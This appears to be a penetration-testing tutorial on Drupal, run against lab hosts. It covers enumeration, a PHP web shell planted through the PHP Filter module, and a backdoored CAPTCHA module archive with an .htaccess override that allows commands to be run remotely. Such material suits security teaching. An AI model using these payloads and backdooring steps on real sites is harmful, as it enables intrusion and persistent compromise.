

# Discovery/Footprinting


A Drupal website can be identified in several ways, including by the header or footer message Powered by Drupal, the standard Drupal logo, the presence of a `CHANGELOG.txt` file or `README.txt` file, via the page source, or clues in the `robots.txt` file such as references to `/node`.

`$ curl -s http://drupal.inlanefreight.local | grep Drupal`

Another way to identify Drupal CMS is through nodes. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`.


Note: Not every Drupal installation will look the same or display the login page or even allow users to access the login page from the internet.

# Default Users

Drupal supports three types of users by default:

-   Administrator: This user has complete control over the Drupal website.
-    Authenticated User: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
-    Anonymous: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.


    
# Enumeration


`$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""`


`$ droopescan scan drupal -u http://drupal.inlanefreight.local`


# Leveraging the PHP Filter Module

In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated."

From here, we could tick the check box next to the module and scroll down to Save configuration. 

Next, we could go to Content --> Add content and create a Basic page.

We can now create a page with a malicious PHP snippet such as the one below. 
```
    <?php
    system($_GET['cmd']);
    ?>
```
We also want to make sure to set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, in this example `http://drupal-qa.inlanefreight.local/node/3`. Once saved, we can either request execute commands in the browser by appending `?cmd=id` to the end of the URL to run the id command or use cURL on the command line. From here, we could use a bash one-liner to obtain reverse shell access.

`$ curl -s http://drupal-qa.inlanefreight.local/node/3?cmd=id | grep uid | cut -f4 -d">"`

From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves. 

`$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`

Once downloaded go to `Administration > Reports > Available updates`.

Note: Location may differ based on the Drupal version and may be under the Extend menu.

From here, click on Browse, select the file from the directory we downloaded it to, and then click Install.


Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.



# Uploading a Backdoored Module

    
Drupal allows users with appropriate permissions to upload a new module. Modules can be found on the drupal.org website. Let's pick a module such as CAPTCHA.

`$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`
    
`$ tar xvf captcha-8.x-1.2.tar.gz`

Create a PHP web shell

Next, we need to create a `.htaccess` file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the `/modules` folder.

```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.

`$ mv shell.php .htaccess captcha`

`$ tar cvf captcha.tar.gz captcha/`

Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install.

Once the installation succeeds, browse to /modules/captcha/shell.php to execute commands.

`$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?cmd=id`


